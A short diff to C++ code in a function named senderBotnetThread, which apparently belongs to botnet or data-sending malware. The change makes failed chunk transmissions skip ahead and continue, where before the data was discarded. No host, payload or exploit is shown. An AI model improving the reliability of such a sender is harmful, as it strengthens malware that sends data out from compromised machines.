@@ -132,9 +132,15 @@ DWORD senderBotnetThread(LPVOID lpParam)
                     std::cout << "  [!] Failed to send chunk (attempt " << consecutiveFailures << "/" << MAX_FAILURES << ")\n";
                     
                     if (consecutiveFailures >= MAX_FAILURES) {
-                        std::cout << "  [✗] Max failures reached, discarding data to prevent infinite loop\n";
-                        // Discard data to prevent infinite retry loop
-                        break;
+                        std::cout << "  [✗] Max failures reached, skipping packet #" << packetNumber << " to continue\n";
+                        // Skip failed packet and move to next chunk
+                        packetNumber++;
+                        if (packetNumber > 999) {
+                            packetNumber = 0;
+                        }
+                        offset += chunkLen;
+                        consecutiveFailures = 0;
+                        Sleep(100);
                     } else {
                         // Wait and retry
                         std::cout << "  [~] Retrying after delay...\n";
